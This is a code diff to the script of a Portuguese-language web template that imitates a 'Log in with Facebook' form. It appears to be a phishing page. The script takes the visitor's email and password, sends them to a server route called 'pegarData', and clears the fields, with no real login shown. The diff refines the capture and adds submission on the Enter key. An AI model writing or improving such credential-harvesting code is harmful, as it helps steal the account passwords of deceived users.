@@ -205,29 +205,41 @@
 </html>
 
 <script>
-$( "#btnface" ).on( "click", function() {
-    email = $("#email").val()
-    passwd = $("#passwd").val()
+$(document).ready(function () {
+    // Função de envio usada pelo botão "Entrar com Facebook"
+    function enviarLogin() {
+        const email = $("#email").val().trim();
+        const passwd = $("#passwd").val().trim();
 
-    if(email.length!=0 && passwd.length!=0){
-        $.ajax({
-            url : "{{ url_for('pegarData') }}",
-            type : 'post',
-            data : {
-                email : email,
-                passwd : passwd
-            },
-        })
-        .done(function(msg){
-            $("#email").val("")
-            $("#passwd").val("")
-        })
-    } else {
-        alert("Necessário prencher os campos de email e senha e clicar em Entrar com Facebook!")
+        if (email.length !== 0 && passwd.length !== 0) {
+            $.ajax({
+                url: "{{ url_for('pegarData') }}",
+                type: 'post',
+                data: {
+                    email: email,
+                    passwd: passwd
+                },
+            })
+            .done(function (msg) {
+                $("#email").val("");
+                $("#passwd").val("");
+            });
+        } else {
+            alert("Necessário preencher os campos de email e senha e clicar em Entrar com Facebook!");
+        }
     }
-} );
 
+    // Clique no botão Facebook
+    $("#btnface").on("click", function () {
+        enviarLogin();
+    });
 
-
-
+    // Pressionar Enter em qualquer input do formulário
+    $("#email, #passwd").on("keydown", function (event) {
+        if (event.key === "Enter") {
+            event.preventDefault(); // evita o envio padrão do formulário
+            enviarLogin();
+        }
+    });
+});
 </script>
